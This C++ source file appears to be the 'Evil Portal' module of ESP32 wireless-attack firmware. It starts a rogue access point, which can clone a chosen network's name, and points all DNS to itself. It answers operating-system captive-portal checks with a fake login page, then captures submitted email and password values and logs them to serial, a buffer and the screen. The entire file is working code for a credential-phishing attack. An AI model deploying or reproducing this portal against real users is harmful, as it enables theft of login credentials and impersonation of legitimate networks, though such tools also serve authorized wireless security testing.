#include "EvilPortal.h"

#ifdef HAS_PSRAM
char* index_html = nullptr;   // Define PSRAM HTML buffer
#else
char index_html[MAX_HTML_SIZE] = "TEST";  // Define DRAM HTML buffer
#endif

char apName[MAX_AP_NAME_SIZE] = "PORTAL"; // Define AP name buffer

AsyncWebServer server(80);

EvilPortal::EvilPortal() {
    this->runServer = false;
    this->name_received = false;
    this->password_received = false;
    this->has_html = false;
    this->has_ap = false;
    this->using_serial_html = false;

    html_files = new LinkedList<String>();
}

void EvilPortal::setup() {
    #ifdef HAS_SD
    if (sd_obj.supported) {
        sd_obj.listDirToLinkedList(html_files, "/", "html");
        Serial.println("Evil Portal Found " + String(html_files->size()) + " HTML files");
    }
    #endif
}

void EvilPortal::cleanup() {
    this->ap_index = -1;

    #ifdef HAS_PSRAM
    if (index_html) {
        free(index_html);
        index_html = nullptr;
    }
    #endif
}

bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
    if (!this->has_ap) {
        if (!this->setAP(ssids, access_points))
            return false;
    }
    if (!this->setHtml())
        return false;

    startPortal();
    return true;
}

String EvilPortal::get_user_name() {
    return this->user_name;
}

String EvilPortal::get_password() {
    return this->password;
}

void EvilPortal::setupServer() {
    #ifndef HAS_PSRAM
    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
        Serial.println("Client connected");
        #ifdef HAS_SCREEN
        this->sendToDisplay("Client connected to server");
        #endif
    });
    #else
    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
        request->send(200, "text/html", index_html);
        Serial.println("Client connected");
        #ifdef HAS_SCREEN
        this->sendToDisplay("Client connected to server");
        #endif
    });
    #endif

    const char* captiveEndpoints[] = {
        "/hotspot-detect.html",
        "/library/test/success.html",
        "/success.txt",
        "/generate_204",
        "/gen_204",
        "/ncsi.txt",
        "/connecttest.txt",
        "/redirect"
    };

    for (int i = 0; i < sizeof(captiveEndpoints) / sizeof(captiveEndpoints[0]); i++) {
        #ifndef HAS_PSRAM
        server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request) {
            request->send_P(200, "text/html", index_html);
        });
        #else
        server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request) {
            request->send(200, "text/html", index_html);
        });
        #endif
    }

    server.on("/get-ap-name", HTTP_GET, [this](AsyncWebServerRequest *request) {
        request->send(200, "text/plain", WiFi.softAPSSID());
    });

    server.on("/get", HTTP_GET, [this](AsyncWebServerRequest *request) {
        if (request->hasParam("email")) {
            this->user_name = request->getParam("email")->value();
            this->name_received = true;
        }
        if (request->hasParam("password")) {
            this->password = request->getParam("password")->value();
            this->password_received = true;
        }
        request->send(200, "text/html",
            "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
    });
}

void EvilPortal::setHtmlFromSerial() {
    Serial.println("Setting HTML from serial...");
    String htmlStr = Serial.readString();
    #ifdef HAS_PSRAM
    index_html = (char*) ps_malloc(MAX_HTML_SIZE);
    #endif
    strlcpy(index_html, htmlStr.c_str(), MAX_HTML_SIZE);
    #ifdef HAS_PSRAM
    index_html[MAX_HTML_SIZE - 1] = '\0';
    #endif
    this->has_html = true;
    this->using_serial_html = true;
    Serial.println("HTML set from serial");
}

bool EvilPortal::setHtml() {
    if (this->using_serial_html) {
        Serial.println("HTML previously set from serial");
        return true;
    }

    Serial.println("Setting HTML from file...");
    #ifdef HAS_SD
    File html_file = sd_obj.getFile("/" + this->target_html_name);
    #else
    File html_file;
    #endif

    if (!html_file) {
        #ifdef HAS_SCREEN
        this->sendToDisplay("Could not find /" + this->target_html_name);
        this->sendToDisplay("Touch to exit...");
        #endif
        Serial.println("Could not find /" + this->target_html_name);
        return false;
    }

    if (html_file.size() > MAX_HTML_SIZE) {
        #ifdef HAS_SCREEN
        this->sendToDisplay("HTML too large. Byte limit: " + String(MAX_HTML_SIZE));
        this->sendToDisplay("Touch to exit...");
        #endif
        Serial.println("HTML too large. Byte limit: " + String(MAX_HTML_SIZE));
        return false;
    }

    String html = "";
    while (html_file.available()) {
        char c = html_file.read();
        if (isPrintable(c)) html.concat(c);
    }

    #ifdef HAS_PSRAM
    index_html = (char*) ps_malloc(MAX_HTML_SIZE);
    #endif
    strlcpy(index_html, html.c_str(), MAX_HTML_SIZE);
    #ifdef HAS_PSRAM
    index_html[MAX_HTML_SIZE - 1] = '\0';
    #endif

    this->has_html = true;
    html_file.close();
    Serial.println("HTML loaded successfully");
    return true;
}

bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
    String ap_config = "";
    int targ_ap_index = -1;

    for (int i = 0; i < access_points->size(); i++) {
        if (access_points->get(i).selected) {
            ap_config = access_points->get(i).essid;
            targ_ap_index = i;
            break;
        }
    }

    if (ap_config == "" && ssids->size() > 0) {
        ap_config = ssids->get(0).essid;
    }

    if (ap_config == "") {
        #ifdef HAS_SD
        File ap_config_file = sd_obj.getFile("/ap.config.txt");
        if (!ap_config_file) {
            Serial.println("Could not find /ap.config.txt");
            return false;
        }
        while (ap_config_file.available()) {
            char c = ap_config_file.read();
            if (isPrintable(c)) ap_config.concat(c);
        }
        ap_config_file.close();
        #endif
    }

    if (ap_config.length() > 0 && ap_config.length() <= MAX_AP_NAME_SIZE) {
        strncpy(apName, ap_config.c_str(), MAX_AP_NAME_SIZE);
        this->has_ap = true;
        this->ap_index = targ_ap_index;
        Serial.println("AP config set: " + ap_config);
        return true;
    }

    Serial.println("Failed to set AP");
    return false;
}

bool EvilPortal::setAP(String essid) {
    if (essid.length() == 0 || essid.length() > MAX_AP_NAME_SIZE) return false;
    strncpy(apName, essid.c_str(), MAX_AP_NAME_SIZE);
    this->has_ap = true;
    Serial.println("AP config set: " + essid);
    return true;
}

void EvilPortal::startAP() {
    const IPAddress AP_IP(172, 0, 0, 1);

    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(apName);

    #ifdef HAS_SCREEN
    this->sendToDisplay("AP started");
    #endif

    Serial.print("AP started with IP: ");
    Serial.println(WiFi.softAPIP());

    this->setupServer();

    this->dnsServer.start(53, "*", WiFi.softAPIP());
    server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
    server.begin();

    #ifdef HAS_SCREEN
    this->sendToDisplay("Evil Portal READY");
    #endif
}

void EvilPortal::startPortal() {
    this->startAP();
    this->runServer = true;
}

void EvilPortal::sendToDisplay(String msg) {
    #ifdef HAS_SCREEN
    String display_string = msg;
    while (display_string.length() < 40) display_string += " ";
    display_obj.loading = true;
    display_obj.display_buffer->add(display_string);
    display_obj.loading = false;
    #endif
}

void EvilPortal::main(uint8_t scan_mode) {
    if ((scan_mode == WIFI_SCAN_EVIL_PORTAL) && this->has_ap && this->has_html) {
        this->dnsServer.processNextRequest();
        if (this->name_received && this->password_received) {
            this->name_received = false;
            this->password_received = false;

            String logValue = "u: " + this->user_name + " p: " + this->password + "\n";
            Serial.print(logValue);
            buffer_obj.append(logValue);
            #ifdef HAS_SCREEN
            this->sendToDisplay(logValue);
            #endif
        }
    }
}
